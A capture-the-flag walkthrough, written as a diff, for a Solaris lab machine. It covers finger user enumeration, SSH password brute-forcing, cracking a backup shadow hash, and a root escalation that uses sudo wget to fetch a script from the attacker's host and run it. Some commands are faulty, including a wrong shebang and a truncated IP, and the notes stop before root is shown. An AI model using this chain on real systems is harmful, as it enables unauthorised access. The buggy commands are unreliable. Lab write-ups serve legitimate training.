@@ -1,0 +1,179 @@
+1. start with nmap scan
+
+nmap -sC -sV 10.10.76
+
+PORT      STATE    SERVICE       VERSION
+19/tcp    filtered chargen
+26/tcp    filtered rsftp
+79/tcp    open     finger        Sun Solaris fingerd
+|_finger: No one logged on\x0D
+89/tcp    filtered su-mit-tg
+111/tcp   open     rpcbind
+
+2. Scan nmap for all the ports 
+
+nmap -p- 10.10.10.76 --max-retries 1
+
+we add --max-retries 1 to reduce the time for scan
+
+This scan outputs
+
+79/tcp    open  finger
+111/tcp   open  rpcbind
+22022/tcp open unknown (Port not written, recheck)
+39419/tcp open  unknown
+51204/tcp open  unknown
+
+
+3. We found finger service running in port 79. We go ahead and enumerate the users
+
+4. download finger-user-enum perl script from pentestmonkey and download names.txt
+from secLists, then run below command. add "| less -S" at the end to avoild line wrapping
+
+/finger-user-enum.pl -U /home/kali/Downloads/finger-user-enum-1.0/names.txt -t 10.10.10.76 | less -S
+
+we have found 3 active users => root, sammy and sunny
+
+root@10.10.10.76: root     Super-User            pts/3        <Apr 24, 2018> sunday              ..
+sammy@10.10.10.76: sammy                 pts/2        <Apr 24, 2018> 10.10.14.4          ..
+sunny@10.10.10.76: sunny                 pts/3 
+
+5. Run a port scan for all ports received 
+
+nmap -sC -sV -p 79,111,22022,35342,56272 TargetedPorts 10.10.10.76
+
+PORT      STATE  SERVICE VERSION
+79/tcp    open   finger?
+|_finger: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines: 
+|_    No one logged on
+111/tcp   open   rpcbind
+22022/tcp open   ssh     SunSSH 1.3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
+|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
+35342/tcp closed unknown
+56272/tcp closed unknown
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port79-TCP:V=7.80%I=7%D=7/13%Time=5F0C9CC1%P=x86_64-pc-linux-gnu%r(Gene
+SF:ricLines,12,"No\x20one\x20logged\x20on\r\n");
+
+
+6. Run ssh command using sunny user
+
+  ssh -p 22022 sunny@10.10.10.76 ==> this command outputs 
+
+  Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. 
+Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
+
+ So now add a keyexchange method to the command
+
+    ssh -okexAlgorithms=+diffie-hellman-group1-sha1 -p 22022 sunny@10.10.10.76
+
+    This command is successful and sunny's password is required for login.
+
+
+7. For attacking password we use the brute-forcing using patator
+
+patator ssh_login host=10.10.10.76 port=22022 user=sunny password=FILE0 0=/home/kali/SecLists/Passwords/probable-v2-top1575.txt persistent=0 
+-x ignore:mesg='Authentication failed.'
+''
+We found the password for Sunny is 'sunday'
+
+Login using SSH and with key exchange alorithm specified
+
+==>   ssh -okexAlgorithms=+diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1 sunny@10.10.10.76 -p 22022
+
+8. Now we have successful authentication using SSH into the target
+
+we check privelages using 'sudo -l'
+
+output is  /root/troll
+            testing
+            uid(root)=0, pid(root)=0
+there is no useful information after 'suod /root/troll', it just returs text 'testing'
+
+
+9. Now we checkout other file systems, 
+
+using 'ls /' we found below directories
+
+backup  bin  boot  cdrom  dev  devices  etc  export  home  kernel  lib  lost+found  media  mnt  net  opt  platform  proc  root  rpool  sbin  system  tmp  usr  var
+
+
+cd into 'backup' we have found 2 files
+
+agent22.backup and shadow.backup
+
+cat shadow.backup ==> we found the password hashes for 2 users --> sunny & sammy
+
+copy sammy's hashes crack it get actualy SSH password
+
+$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB
+
+Load this password into a file 'sunday_has' and use John to crack it
+
+sudo john sunday_hash --wordlist=/home/kali/Downloads/rockyou.txt  ==> output is 'cooldude!'
+
+10. Login into Sammy's account using 'su - sammy' with password 'cooldude!'
+
+Now check permissions for sammy using 'sudo -l' it returns "(root) NOPASSWD: /usr/bin/wget"
+
+
+11. PrivEsc
+
+Sammy has wget rights and Sunny has rights to sudo /root/troll file ==> Login as both Sammy and Sunny parallely (using SSH command and cracked password)
+
+
+create bash script in target and name it as 'troll'
+
+with content 
+
+"#!/usr/bash/bin"
+
+              bash
+
+              "
+
+User python file transfer and wget to get this 'troll' file and pass it to target '/root/troll' --> as Sammy user
+
+
+Execute this '/root/troll' as Sunny using by using command 'sudo /root/troll'
+
+12. File transfer
+
+==> sleep 8;sudo wget 10.10.14.22:80/troll -O /root/troll   (Sammy user)
+
+here we use sleep to wait for file getting written in root folder
+
+==> execute "sudo /root/troll" in the same moment wget is about to give 200 OK   (Sunny user)
+
+There is an internal script rewrites '/root/troll' to original content and it is happening every 5 seconds,
+
+If we do "suod /root/troll" after file get restored to original state, we can't get root.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
